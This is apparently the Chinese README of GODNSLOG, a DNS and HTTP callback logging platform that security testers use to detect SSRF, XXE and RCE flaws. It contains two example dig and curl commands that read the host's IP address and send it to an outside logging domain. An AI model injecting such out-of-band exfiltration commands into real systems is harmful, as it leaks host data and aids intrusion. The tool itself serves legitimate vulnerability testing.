# 简介

GODNS功能特性:
- 多用户
- DNSLOG
- HTTPLOG 记录
- DNS Rebinding
- 记录结果推送

CEYE.IO platform, which monitoring DNS queries and HTTP requests through its own DNS server and HTTP server, it can also create custom files as online payloads. It can help security researchers collect information when testing vulnerabilities (e.g. SSRF/XXE/RFI/RCE).

每一个`GODNSLOG`用户会分配一个唯一的域名，域名前缀为`shortId`是godnslog平台的唯一用户标识。 `安全设置`页面中如下图

![](basic-security.png)

`bkkpdcy7lo84.godnslog.com`是给当前用户分配的唯一域名，`bkkpdcy7lo84`为`shortId`区分用户, 三级域名`*.bkkpdcy7lo84.godnslog.com`下所有DNS请求记录均会被记录下来，`*`字段由用户自定义，建议跟扫描ID对应起来，用来关联扫描结果。 


GODNSLOG在设计中大量参考了[CEYE.IO](http://ceye.io)，包括本文档的内容也是，在此向`CEYE.IO`平台致敬。

## DNS LOG功能

每个用户分配一个唯一的三级域名，该域名或其子域名的所有解析记录均会被记录。
请求记录超过设置的最长时间会被自动清理，自动清理时间设置范围是1-48小时


```bash
dig `/sbin/ifconfig eth0|grep inet|grep -v 127.0.0.1|grep -v inet6|awk '{print $2}'|tr -d "addr:"`.ktqlujjpgc4j.godns.vip
```

系统生成域名为`{$variable}.ktqlujjpgc4j.godns.vip`，其中`ktqlujjpgc4j`是用户唯一shortId，`{$variable}`为用户自定义变量


![](dnslog.png)


DNSLOG 记录内容包含以下字段：
- domain
- IP
- 记录时间

请求记录超过设置的最长时间会被自动清理，自动清理时间设置范围是1-48小时



## HTTP LOG功能

GODNSLOG 的`/log/`接口提供了HTTPLOG的功能，访问`http://*.{shortId}.godnslog.com/log/?p=httptest`的记录都会被记录下来

记录内容包含以下字段:

- IP
- Method
- URL
- User-Agent
- Content-Type 类型
- Data body数据
- 记录时间

```bash
curl http://ktqlujjpgc4j.godns.vip/log/`/sbin/ifconfig eth0|grep inet|grep -v 127.0.0.1|grep -v inet6|awk '{print $2}'|tr -d "addr:"`
```
请求记录超过设置的最长时间会被自动清理，自动清理时间设置范围是1-48小时


## 致谢

[CEYE.IO](http://ceye.io)
[dnslog](https://github.com/fanjq99/dnslog)
